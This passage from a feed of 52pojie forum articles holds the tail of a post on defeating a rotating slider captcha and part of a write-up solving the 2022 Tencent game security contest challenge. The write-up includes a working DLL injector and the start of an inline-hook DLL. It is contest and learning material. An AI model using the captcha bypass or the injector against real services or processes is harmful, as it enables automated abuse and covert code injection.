/></p><p>由于具有针对性，该识别方案的准确率远远高于第一种，但是缺陷是，识别时间较久，且计算量较大</p><p>原因很简单，因为需要目标检测再加上匹配每一个角度和多个缺口图片，所以消耗时间高于第一种方案</p><h3>3.目标检测 + 滑块曲线经过位置 + 置信度比较</h3><p>最后我想出了另一种识别方案，既然识别缺口角度比较麻烦，那么能不能通过滑块的移动轨迹去匹配缺口呢？</p><p>再多次观察可以发现，滑块不是每次都经过两个缺口，能不能只算出经过的缺口就行了</p><p>步骤是这样的:</p><ul><li style="margin-left: 2px;"><p>通过<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>计算滑块移动曲线</p></li><li style="margin-left: 2px;"><p>使用yolo识别缺口位置</p></li><li style="margin-left: 2px;"><p>再通过三角函数计算去除空白背景的滑块轨迹（每个坐标点和旋转角度）</p></li><li style="margin-left: 2px;"><p>算出滑块轨迹和每个缺口的最小距离，再比较每个缺口的最小距离，距离最小的就是目标缺口</p></li><li style="margin-left: 2px;"><p>如果每个缺口的最小距离只差小于一定阈值，则使用距离每个缺口最小轨迹点的旋转角度去目标匹配得到置信度</p></li><li style="margin-left: 2px;"><p>置信度最高的缺口就是目标缺口</p></li></ul><p>为了方便，我画了一张图表示怎么算出滑块轨迹点</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4366bcc7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCyKKNiautLUlsdGkWfLXJByW56Z4LDQSKMviapfdsUibsBUTYyPXiaUgzZg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>我总结了以下内容，需要三角函数的知识</p><ul><li style="margin-left: 2px;"><p>首先算出去除空白背景滑块的中心点，再得到<code style="font-family: SFMono-Regular, Consolas, ;">α</code></p></li><li style="margin-left: 2px;"><p>然后通过<code style="font-family: SFMono-Regular, Consolas, ;">β</code>和<code style="font-family: SFMono-Regular, Consolas, ;">α</code>算出<code style="font-family: SFMono-Regular, Consolas, ;">γ</code></p></li><li style="margin-left: 2px;"><p>通过<code style="font-family: SFMono-Regular, Consolas, ;">γ</code>算出<code style="font-family: SFMono-Regular, Consolas, ;">x2</code>和<code style="font-family: SFMono-Regular, Consolas, ;">y</code></p></li><li style="margin-left: 2px;"><p>滑块轨迹点 = (滑块宽度 + x1 + x2, y)</p></li></ul><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> cv2<br /><br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_slide_center</span>(image_path):<br />    <span style="color: rgb(168, 255, 96);">"""获取滑块中心点坐标, 不包含透明背景"""</span><br />    <span style="color: rgb(124, 124, 124);"># 读取图片</span><br />    image = cv2.imread(image_path, cv2.IMREAD_UNCHANGED)<br />    <span style="color: rgb(124, 124, 124);"># 提取Alpha通道</span><br />    alpha_channel = image[:, :, <span style="color: rgb(255, 115, 253);">3</span>]<br />    <span style="color: rgb(124, 124, 124);"># 寻找非零Alpha值的最小边界框</span><br />    _, thresh = cv2.threshold(alpha_channel, <span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(255, 115, 253);">255</span>, cv2.THRESH_BINARY)<br />    contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)<br />    x, y, w, h = cv2.boundingRect(contours[<span style="color: rgb(255, 115, 253);">0</span>])<br />    <span style="color: rgb(124, 124, 124);"># 裁剪图片</span><br />    <span style="color: rgb(150, 203, 254);">return</span> [int(w / <span style="color: rgb(255, 115, 253);">2</span> + x), int(h / <span style="color: rgb(255, 115, 253);">2</span> + y)]</code></pre><p>得到所有轨迹点后，绘制到背景图上查看结果</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=53dcf84e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCsUh9daTCVE8EfItGdHa1c1pPfImWAkZtLmbVZEY7ldIsaRMLibRBWZQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="320" /></p><p><br /></p><p>接下来就是计算缺口图片中心点到轨迹线的最小距离，然后比较就行了</p><p>如果轨迹线经过了2个缺口的中心点，那么就可以根据轨迹点去旋转滑块图片再去匹配缺口图片，取置信度最高的即可</p><h2>总结</h2><blockquote><h4 style="margin-bottom: 16px; font-size: 1em; font-weight: 600; line-height: 1.25;">训练该缺口的目标检测我使用了500张图片的数据集，不过我认为300张就够了，具体怎么训练可以参考我之前的文章。</h4></blockquote><p>另外，我不是什么大佬，我只是站在了巨人的肩膀上</p><p>最后，如果大家有个更好的方法欢迎大家讨论！</p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1904971-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Wed, 27 Mar 2024 16:38:19 +0800</pubDate>
</item>
<item>
<title>2022腾讯游戏安全大赛复盘</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140353&amp;idx=1&amp;sn=ee512da957024b45e2e854aaee2725c0&amp;chksm=bd50a1558a2728434bb74fc90144a2573311afe7dbc9a664250f2f57163e533b07b0bcf40366&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140353&amp;idx=1&amp;sn=ee512da957024b45e2e854aaee2725c0&amp;chksm=bd50a1558a2728434bb74fc90144a2573311afe7dbc9a664250f2f57163e533b07b0bcf40366&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-03-25 18:17</span> <span style="display: inline-block;">北京</span>
</p>

<p>复盘一下2022的腾讯游戏安全比赛。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=711f4a16&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlq70wGgFCXjzel6Q1tSPC27hrlg7xWOWsmRr48hd5OJ0DW8tOR4KdTQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; line-height: normal;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>xia0ji233</strong></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p>复盘一下2022的腾讯游戏安全比赛。</p><h2>初赛</h2><h3>题目说明</h3><p>这里有一个画了flag的小程序，可好像出了点问题，flag丢失了，需要把它找回来。</p><p>题目</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6cf23250&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRliclwthkflkWNUogJ3ic1CScTw23djdRBgdTUGGPZejr12AhClt1JGAjA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>找回flag样例：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=51c977cd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlOZf7mDTNTk7kC1gyBwJ1e9Xv72w3gE3uL5aR3a8ticv4x9icZQRg2EKg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><span style="font-weight: 700;">要求：</span></p><ol><li style="margin-left: 2px;"><p>不得直接patch系统组件实现绘制（如：直接编写D3D代码绘制flag），只能对题目自身代码进行修改或调用。</p></li><li style="margin-left: 2px;"><p>找回的flag需要和预期图案（包括颜色）一致，如果绘制结果存在偏差会扣除一定分数。</p></li><li style="margin-left: 2px;"><p>赛后需要提交找回flag的<span style="font-weight: 700;">截图</span>和<span style="font-weight: 700;">解题代码或文档</span>进行评分。</p></li></ol><p><span style="font-weight: 700;">评分标准：</span></p><p>根据提交截图和代码文档的时间作为评分依据。</p><h3>解题过程</h3><p>先打开所给的程序，发现输出 ACE 的 LOGO 过一会后会消失。</p><p>IDA，打开找到 WinMain 函数，找到消息循环函数，分析主体逻辑</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0c321a95&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlxs5jGlpy9aRtFuohQOYZeTaicMZ7ic9ickAAcicwQvOvYKrXCwNbqicKkTQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>看到主体的函数</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=43b2beeb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl7OkicEvIT3uhiaayH58AEnqByEkjEzdGicbfT6tMTlEIicTq1sSlUrPwyA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" /></p><p>有一个初始化的操作，会分配一片可读可写可执行（<code style="font-family: SFMono-Regular, Consolas, ;">#define PAGE_EXECUTE_READWRITE  0x40</code>）内存并将代码拷贝过去，主要有 <code style="font-family: SFMono-Regular, Consolas, ;">140005040</code> 和 <code style="font-family: SFMono-Regular, Consolas, ;">140006350</code> 两个地址的代码。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a5fd5fe5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlIUQPWoELSKw96jGrmeJnQHzic5pCWkibgbgvkMvjgJdzia60MnZsPficFQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>第一段拷贝完成之后可以发现它 PATCH 了函数开头的几个字节，应该是防静态分析的，而且看字节大概是 <code style="font-family: SFMono-Regular, Consolas, ;">PUSH,POP</code> 指令。</p><p>下面可以看到记录了当前的时刻，如果发现起始时刻与当前时刻超过了 4000（4000MS）那么执行下面的指令，这里根据开始的运行大概能猜测出来应该就是停止绘制的代码了。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=e9c5e8dd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlJ9u212T4sqibpD9dmjzlHSkzQEluYsExawn6aEQhEIdtO0iazibTqffGg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>最后调用 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0x650</code> 的代码作为入口，下面可以尝试跟一下这个函数，这里可以采用静态修改代码为真实代码，也可以动调执行到这里的时候反编译。</p><p>直接跟到入口，可以很明显地发现函数入口往后有一段对自身的调用</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8bf949e4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlqjqrVo29wvq3I8gloqxvMWKhoCvOsCGbfmAhYvqkRlke0OT9Jbph0w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>看地址是 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0x420</code>，跟过去，重建函数，是一个很标准的虚拟机流程</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=2e4cea00&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlPnVIcSpIiaZrNJmTbcpKEudpmBibZxicKcP1rY0d2t1GB28cH9r4u6p0g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>虚拟机的代码存在于 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0x1301</code> 的地址，也就是第二次拷贝得到的代码。</p><p>根据自己的理解还原了一下虚拟机的流程：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=3cc70dde&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlFeawvHqP7nS7fE2WOQCuRUHCzUuia5xUwr3SIDAL1nJCt8wNwYia2WkQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><ul><li style="margin-left: 2px;"><p>op0：Stack[0]+=Stack[1]</p></li><li style="margin-left: 2px;"><p>op1：Stack[0]-=Stack[1]</p></li><li style="margin-left: 2px;"><p>op2 num1,num2：Stack[num2]=Stack[num1]</p></li><li style="margin-left: 2px;"><p>op3 num1,num2：Stack[num2]=num1</p></li><li style="margin-left: 2px;"><p>op4 num：这里的操作很神奇，会把栈中第一个值赋值为 <code style="font-family: SFMono-Regular, Consolas, ;">num^'ACE'</code>，第二个值赋值为一个很复杂的运算。</p></li><li style="margin-left: 2px;"><p>op5：调用 shellcode 头部的函数。</p></li><li style="margin-left: 2px;"><p>op6：调用 shellcode 头部的函数，与上一个唯一的区别是第五个参数。</p></li><li style="margin-left: 2px;"><p>op7：退出</p></li></ul><p>而这里的 v16-v18 大概率也是 op2 和 op3 会操作到的，也算栈中的值。</p><p>这里很容易猜测 op5 和 op6 应该是绘制函数的代码。</p><p>FFFF00 刚好是黄色的代码，将取色器放置在程序上也能发现蓝色的代码是 2DDBE7，和这里的颜色代码差了一点，但是可以尝试修改一下。</p><p>CE 找到这个位置，将代码修改一下</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=e5c4207f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlhHxlRhOcHibFooo8sCVlSPa94tzgIbGILlkfjdXyia8ibibJlkHlibGetOw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>这里我直接把它改成 000000 也就是黑色，直接跳出来。</p><p>然后执行完下面的代码，发现输出变成黑色了</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4d54d907&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl0azdla6icPbkS6R2yHllBQLekCEgLIXMFqhGaqptiaSdsvL2M2ZfuZ5g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>那么主要肯定是要分析 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0</code> 处的函数代码了（看不懂直接放弃）。</p><p>虽然看不懂，但是已经知道里面传的一个值是颜色了，去分析分析其他参数的含义就可以了。这里最好的一个办法应该是 hook，去打印它的参数，为了方便可以把它限时输出这点 PATCH 了。</p><p>这个直接去找到它的跳转让它永远跳转或者永远不跳转就行了，这里是改成永远跳转，90 加前面，偏移可以不用动。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0a7e976a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRljiaDSOVjpoROQekhviaRzSYHe6ibZMA98ibwyk7raR6SHBkGHiaZrrAlotg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>写一个 DLL 去做 HOOK，主要去 HOOK shellcode，这个地址通过全局变量可以获得（2022游戏安全技术竞赛初赛.exe+0x8308）。</p><p>64 位的程序hook一般直接用 <code style="font-family: SFMono-Regular, Consolas, ;">inline</code> 或者 <code style="font-family: SFMono-Regular, Consolas, ;">hotfix</code> 或者无痕，个人感觉 <code style="font-family: SFMono-Regular, Consolas, ;">hotfix</code> 实现起来简单，但是个人更喜欢 <code style="font-family: SFMono-Regular, Consolas, ;">inline hook</code>，因为它 <code style="font-family: SFMono-Regular, Consolas, ;">windows</code> 消息的机制，会不停地打印数据，因此加全局变量限制输出前 100 次调用的结果。</p><p>注入器（基本通用的）：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;windows.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;iostream&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;time.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdlib.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;TlHelp32.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> EXEFILEW <span style="color: rgb(168, 255, 96);">L"2022游戏安全技术竞赛初赛.exe"</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> EXEFILE <span style="color: rgb(168, 255, 96);">"2022游戏安全技术竞赛初赛.exe"</span></span><br />DWORD old;<br />SIZE_T written;<br />DWORD <span style="color: rgb(255, 255, 182);">FindProcess</span>() {<br />    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color: rgb(255, 115, 253);">0</span>);<br />    PROCESSENTRY32 pe32;<br />    pe32 = { sizeof(pe32) };<br />    BOOL ret = Process32First(hSnap, &amp;pe32);<br />    <span style="color: rgb(150, 203, 254);">while</span> (ret)<br />    {<br />        <span style="color: rgb(150, 203, 254);">if</span> (!wcsncmp(pe32.szExeFile,  EXEFILEW, lstrlen(EXEFILEW))) {<br />            printf(<span style="color: rgb(168, 255, 96);">"找到程序 %s ,PID=%d\n"</span>, EXEFILE, pe32.th32ProcessID);<br />            <span style="color: rgb(150, 203, 254);">return</span> pe32.th32ProcessID;<br />        }<br />        ret = Process32Next(hSnap, &amp;pe32);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">InjectModule</span>(DWORD ProcessId, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span>* szPath)<br />{<br />    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);<br />    printf(<span style="color: rgb(168, 255, 96);">"进程句柄:%p\n"</span>, hProcess);<br />    LPVOID lpAddress = VirtualAllocEx(hProcess, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(255, 115, 253);">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br />    SIZE_T dwWriteLength = <span style="color: rgb(255, 115, 253);">0</span>;<br />    WriteProcessMemory(hProcess, lpAddress, szPath, strlen(szPath), &amp;dwWriteLength);<br />    HANDLE hThread = CreateRemoteThread(hProcess, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(198, 197, 254);">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(198, 197, 254);">NULL</span>);<br />    WaitForSingleObject(hThread, <span style="color: rgb(255, 115, 253);">-1</span>);<br />    VirtualFreeEx(hProcess, lpAddress, <span style="color: rgb(255, 115, 253);">0</span>, MEM_RELEASE);<br />    CloseHandle(hProcess);<br />    CloseHandle(hThread);<br />}<br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>() {<br />    DWORD ProcessId = FindProcess();<br />    <span style="color: rgb(150, 203, 254);">while</span> (!ProcessId) {<br />        printf(<span style="color: rgb(168, 255, 96);">"未找到%s程序，等待两秒中再试\n"</span>,EXEFILE);<br />        Sleep(<span style="color: rgb(255, 115, 253);">2000</span>);<br />        ProcessId = FindProcess();<br />    }<br />    InjectModule(ProcessId, <span style="color: rgb(168, 255, 96);">"C:\\Users\\xia0ji233\\source\\repos\\T2022Pre\\x64\\Debug\\hack.dll"</span>);<br />}</code></pre><p>用于 HOOK 的 DLL：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;math.h&gt;</span></span><br /><span style="color: rgb(150, 203, 254);">typedef</span> __int64 (*Func)(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);<br />__int64 <span style="color: rgb(255, 255, 182);">GetBaseAddr</span>() {<br />    HMODULE hMode = GetModuleHandle(<span style="color: rgb(198, 197, 254);">nullptr</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span> (__int64)hMode;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span>* shellcode = <span style="color: rgb(255, 115, 253);">0</span>;<br />BYTE HookCode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,  <span style="color: rgb(124, 124, 124);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span>                                           <span style="color: rgb(124, 124, 124);">//jmp rax </span><br />};<br />BYTE OriginCode[<span style="color: rgb(255, 115, 253);">0x50</span>];<br /><span style="color: rgb(255, 255, 182);">size_t</span> HookLen = <span style="color: rgb(255, 115, 253);">12</span>;<br />__int64 times = <span style="color: rgb(255, 115, 253);">100</span>;<br />__int64 <span style="color: rgb(255, 255, 182);">HackShellcode</span>(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10) {<br />    memcpy(shellcode, OriginCode,HookLen);              <span style="color: rgb(124, 124, 124);">//unhook</span><br />    <span style="color: rgb(124, 124, 124);">//</span><br />    <span style="color: rgb(255, 255, 182);">int</span> x = a1, y = a2;<br />    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, <span style="color: rgb(255, 115, 253);">0xFFFF0000</span>, a6, a7, a8, a9, a10);<br />    times--;<br />    <span style="color: rgb(150, 203, 254);">if</span> (times&gt;<span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"call 